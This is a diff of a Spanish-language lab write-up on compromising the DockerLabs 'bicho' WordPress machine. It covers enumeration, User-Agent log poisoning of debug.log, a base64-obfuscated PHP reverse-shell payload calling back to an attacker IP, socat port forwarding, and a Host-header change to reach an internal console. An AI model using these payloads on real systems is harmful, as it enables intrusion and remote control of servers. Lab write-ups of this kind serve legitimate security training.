@@ -2,35 +2,27 @@
 
 ### 💡 **Dificultad:** Fácil
 
-![Despliegue](Imágenes/2025-05-20_04-42.png)
+📦 **Plataforma:** DockerLabs
+🌐 **Objetivo:** Obtener acceso total (root) explotando servicios expuestos y configuraciones inseguras en una instalación de WordPress.
 
 ---
 
-## 📝 **Descripción de la máquina**
+## 🚀 **Despliegue de la Máquina**
 
-
----
-
-## 🎯 **Objetivo**
-
----
-
-## ⚙️ **Despliegue de la máquina**
-
-Se descarga el archivo comprimido de la máquina vulnerable y se lanza el contenedor Docker mediante el script incluido:
+Se inicia la máquina vulnerable descomprimiendo el archivo y ejecutando el script de despliegue:
 
 ```bash
 unzip bicho.zip
 sudo bash auto_deploy.sh backend.tar
 ```
 
-![Despliegue](Imágenes/Capturas.png)
+![Despliegue](Imágenes/2025-05-20_04-42.png)
 
 ---
 
-## 📡 **Comprobación de conectividad**
+## 📶 **Comprobación de Conectividad**
 
-Verificamos que la máquina se encuentra activa respondiendo a peticiones ICMP (ping):
+Validamos que la máquina responde:
 
 ```bash
 ping -c1 172.17.0.2
@@ -42,20 +34,20 @@ ping -c1 172.17.0.2
 
 ## 🔍 **Escaneo de Puertos**
 
-Realizamos un escaneo completo para detectar todos los puertos abiertos:
+### 🔎 Escaneo Total
 
 ```bash
 sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
 ```
 
-**Puertos detectados:**
+**Puertos abiertos:**
 
 * `22/tcp`: SSH
 * `80/tcp`: HTTP
 
 ![Puertos](Imágenes/Capturas_2.png)
 
-Luego, analizamos los servicios y versiones asociados a esos puertos:
+### 🧩 Detección de Servicios
 
 ```bash
 nmap -sCV -p22,80 172.17.0.2 -oN target.txt
@@ -65,187 +57,241 @@ nmap -sCV -p22,80 172.17.0.2 -oN target.txt
 
 ---
 
-En el escaeno se encontro un dombre de dominio y lo agregamo a nano /etc/hosts 172.17.0.2 bicho.dl
-![etc/host](Imágenes/Capturas_4.png)
+## 🧭 **Reconocimiento Web**
+
+### 🖥️ Acceso inicial
+
+Al acceder a `http://172.17.0.2`, se muestra una página de bienvenida.
+
+![Página](Imágenes/Capturas_5.png)
+
+### 🧾 Hosts
+
+Agregamos el nombre de dominio al archivo `/etc/hosts`:
+
+```bash
+sudo nano /etc/hosts
+# Añadir línea:
+172.17.0.2 bicho.dl
+```
+
+![etc/hosts](Imágenes/Capturas_4.png)
 
 ---
-Al entrar http://172.17.0.2 encontramos una pagina de bienbenida
-![Pagina](Imágenes/Capturas_5.png)
 
-Al solo tener disponible una pagina web busque mas inforamcion al realizar fuzzin no se encontro nada pero use whatweb '172.17.0.2' y encontre que trabaja con WordPress y al buscar alguna vulnerabilidad con searchsploit WordPress 6.6.2 encontre que puede 
-ser vulnerable a InyeccionSQL
+### 🔎 Análisis con WhatWeb
+
+```bash
+whatweb http://bicho.dl
+```
+
+Detectamos que el sitio corre **WordPress 6.6.2**.
+
 ![Versiones](Imágenes/Capturas_6.png)
 
-Use wpscan --url http://bicho.dl/ --enumerate u para escanear el sitio WordPress y descubrir los nombres de usuario registrados en este caso se encotro el usuario bicho y se encontraron varios directorios ocultos tambien.
+---
+
+## 🛠️ **Enumeración en WordPress**
+
+### 🔍 WPScan
+
+Enumeramos usuarios y directorios:
+
+```bash
+wpscan --url http://bicho.dl/ --enumerate u
+```
+
+* Usuario encontrado: `bicho`
+* Archivos sensibles y rutas descubiertas
+
 ![wpscan](Imágenes/Capturas_7.png)
 
-hicimos un fuzzin a gobuster dir -u  http://bicho.dl/wp-content/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -add-slash -b 403,404 -x .php,.html,.txt el directorio /wp-content/ se encontro en la busqueda de usuario 
-anteriror y se encontraron:
-/index.php           
-/themes               
-/uploads             
-/plugins         
-/upgrade            
-/fonts                
+---
+
+### 🗂️ Fuzzing de Directorios
+
+```bash
+gobuster dir -u http://bicho.dl/wp-content/ \
+-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
+-t 20 -add-slash -b 403,404 -x .php,.html,.txt
+```
+
+**Rutas encontradas:**
+
+* `/index.php`
+* `/themes/`
+* `/uploads/`
+* `/plugins/`
+* `/fonts/`
+* `/upgrade/`
+
 ![Fuzzing](Imágenes/Capturas_8.png)
 
-Encontramos http://bicho.dl/wp-content/debug.log cuando hisimos en escaneo de worplasse y nos encontramos el intento de inicio de sesion que se realizo con wpscan --url http://bicho.dl/ --enumerate u
+---
+
+## 🕵️‍♂️ **Log Poisoning en WordPress**
+
+### 🐾 Archivo sospechoso
+
+Durante el escaneo detectamos `debug.log`:
+
+```bash
+http://bicho.dl/wp-content/debug.log
+```
+
 ![logs](Imágenes/Capturas_9.png)
 
-Se intentara hacer un log poisoning https://lathack.com/vulnerabilidad-log-poisoning/ Se analiza WordPress que muestra IP, User-Agent y usuario autenticado en `<pre>`. Si no hay filtrado adecuado, un atacante podría inyectar código malicioso 
-en el User-Agent y verificar si se ejecuta desde los logs nos dijijimos a http://bicho.dl/wp-login.php que es el archivo de login por defecto de WordPress, ubicado en la raíz. Se usa para autenticar usuarios y puede registrar cabeceras manipuladas.
-![pre](Imágenes/Capturas_11.png)
+---
+
+### 🐚 Inyección vía User-Agent
+
+Interceptamos el login con Burp Suite y lo mandamos a **Repeater**.
+
+![Intercept](Imágenes/Capturas_14.png)
+
+Modificamos la cabecera:
+
+```
+User-Agent: <?php phpinfo(); ?>
+```
+
+![LogPoisoning](Imágenes/Capturas_15.png)
 
 ---
 
-![Registro](Imágenes/Capturas_12.png)
+### 💥 Ejecución exitosa
 
-Nos vamos a burpsuite y interceptamos la peticion de inicio de sesion y lo mandamos al repeter
-![Registro](Imágenes/Capturas_14.png)
+Al visitar de nuevo el archivo `debug.log`, vemos la ejecución de `phpinfo()`:
 
----
-Peticion interceptada y mandada a repeter
-![Registro](Imágenes/Capturas_13.png)
-
-Cambiamos User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0 por: User-Agent: <?php phpinfo();?> y mandamos la nueva peticion
-![LogPoisonig](Imágenes/Capturas_15.png)
-
-Al recargar http://bicho.dl/wp-content/debug.log y aceptar la peticion en burpsuite en proxy podemos ver las espesificiones de php, Log Poisoning (envenenamiento de logs), donde el objetivo es que código inyectado en los headers HTTP (como User-Agent) se ejecute al ser leído desde los logs, si el servidor permite interpretarlos como código PHP.
 ![PHP](Imágenes/Capturas_16.png)
 
+---
 
-Nos ponemos en modo escuha:  sudo nc -lvnp 443
+## 🐍 **Obteniendo Reverse Shell**
 
-Ahora hacemos una inyección de código PHP que ejecuta un comando codificado en Base64, y luego lo pasa a bash Se logra inyectar este código PHP en los logs o en algún archivo .php que luego puedas ejecutar vía navegador, y si el sistema permite conexiones salientes, entonces:
-Al visitar ese archivo (http://bicho.dl/wp-content/debug.log), el servidor intentará conectarse de vuelta a tu máquina atacante (192.168.1.84, puerto 443).
+### 🧨 Inyección de Payload
+
+Escuchamos con Netcat:
+
+```bash
+sudo nc -lvnp 443
+```
+
+Y enviamos este payload en User-Agent:
+
+```php
 <?php echo `printf c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjg0LzQ0MyAwPiYx | base64 -d | bash`; ?>
+```
 
-Se muestra que la revelsell se ejecuto con exito, nos vamos a proxi y aceptamos la peticion y se abrita la termianl
-![Revellshel](Imágenes/Capturas_17.png)
+📌 *Este código inyecta un comando que conecta de vuelta al atacante.*
+
+![RevShell](Imágenes/Capturas_17.png)
 
 ---
 
+## 🔐 **Post-Explotación y Escaneo Interno**
 
-### 🔍 Enumeración de puertos
-
-Para ver los puertos abiertos en el servidor, ejecutamos:
+### 🧾 Puertos internos
 
 ```bash
 netstat -tuln
 ```
 
-🔎 **Salida relevante:**
-
-```
-Active Internet connections (only servers)
-Proto Recv-Q Send-Q Local Address           Foreign Address         State      
-tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
-tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
-tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN     
-tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN     
-```
-
-📌 *Explicación:* El puerto **5000** está expuesto solo localmente (`127.0.0.1`), por lo tanto, no podemos acceder directamente desde fuera del servidor. Será necesario un **port forwarding** para reenviarlo a nuestro equipo.
-
----
-
-### 🔁 Transferencia de `socat`
-
-Como la máquina víctima **no tiene `socat` instalado**, lo transferimos desde nuestra máquina:
-
-#### En el host atacante:
-
-```bash
-cp /usr/bin/socat .
-python3 -m http.server
-```
-
-📌 *Explicación:* Esto sirve el binario `socat` por HTTP desde el directorio actual.
-
----
-
-#### En la máquina víctima:
-
-```bash
-cd /tmp
-wget http://<IP>:8000/socat
-chmod +x socat
-```
-
-📌 *Explicación:* Descargamos y damos permisos de ejecución al binario en `/tmp`.
-
----
-
-### 🌐 Port Forwarding
-
-Con `socat`, reenviamos el puerto 5000 de la víctima hacia el 7755, accesible remotamente:
-
-```bash
-./socat TCP-LISTEN:7755,fork TCP:127.0.0.1:5000
+```text
+127.0.0.1:3306    → MySQL  
+127.0.0.1:5000    → Web Interno  
 ```
 
 ---
 
-### ⚠️ Error de librería faltante
+## 🔁 **Tunelización de Puertos con Socat**
 
-Al ejecutar `socat`, puede aparecer el siguiente error:
+### 🚫 Error inicial
+
+`socat` no está disponible y al transferirlo, aparece un error de librería:
 
 ```bash
-./socat: error while loading shared libraries: libwrap.so.0: cannot open shared object file: No such file or directory
+./socat: error while loading shared libraries: libwrap.so.0
 ```
-
-📌 *Explicación:* `socat` necesita la biblioteca `libwrap.so.0`, que no está presente en la máquina víctima.
 
 ---
 
 ### ✅ Solución
 
-#### 1. **Buscar la librería en tu máquina:**
+1. **Transferir socat y la librería:**
 
 ```bash
-find /usr -name libwrap.so.0
-```
-
-#### 2. **Copiarla al servidor web:**
-
-```bash
+# En máquina atacante
+cp /usr/bin/socat .
 cp /usr/lib/x86_64-linux-gnu/libwrap.so.0 .
-```
-
-#### 3. **Activar servidor web:**
-```bash
 python3 -m http.server 8000
 ```
 
-#### 4. **Descargarla en la víctima:**
+2. **En la víctima:**
 
 ```bash
+wget http://<IP>:8000/socat
 wget http://<IP>:8000/libwrap.so.0 -O /tmp/libwrap.so.0
-```
-
-#### 5. **Exportar variable de entorno para encontrar la librería:**
-
-```bash
+chmod +x socat
 export LD_LIBRARY_PATH=/tmp
 ```
- #### 6. ** Realizar la tunelizacion del puerto:**
- ```bash
- ./socat TCP-LISTEN:7755,fork TCP:127.0.0.1:5000 
+
+3. **Tunelizar:**
+
+```bash
+./socat TCP-LISTEN:7755,fork TCP:127.0.0.1:5000
 ```
 
-📌 *Con esto, `socat` debería ejecutarse correctamente.*
-
 ![Socat](Imágenes/Capturas_18.png)
+![Libreria](Imágenes/Capturas_19.png)
 
 ---
 
-![Libreria](Imágenes/Capturas_19.png)
+## 🌐 **Exploración del Servicio Interno**
 
-Si nos vamos a http://172.17.0.2:7755/ vemos una pagina
-![Webservidor](Imágenes/Capturas_20.png)
+Visitamos:
 
-Usamos gobuster dir -u  http://172.17.0.2:7755/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -add-slash -b 403,404 -x .php,.html,.txt para hacer fuzzin y encuentra /console
-Y ahora vamos ha usar em mismo prosedimiento con burpsuite vamos a capturar el trafico de http://172.17.0.2:7755/console y mandarlo a repeter
-![Fuzzing](Imágenes/Capturas_21.png)
+```
+http://172.17.0.2:7755/
+```
 
+¡Y accedemos a la web interna!
+
+![WebInterna](Imágenes/Capturas_20.png)
+
+---
+
+### 📂 Fuzzing interno
+
+```bash
+gobuster dir -u http://172.17.0.2:7755/ \
+-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+-t 20 -add-slash -b 403,404 -x .php,.html,.txt
+```
+
+📌 Ruta importante encontrada: `/console`
+
+![FuzzingInterno](Imágenes/Capturas_21.png)
+
+---
+
+### 🧪 Interacción con Burp Suite
+
+Usamos Burp para modificar el `Host` en la cabecera y acceder correctamente a `/console`:
+
+Original:
+
+```
+Host: 172.17.0.2:7755
+```
+
+Modificado:
+
+```
+Host: 127.0.0.1
+```
+
+Esto permite visualizar la consola de administración interna protegida.
+
+---
 
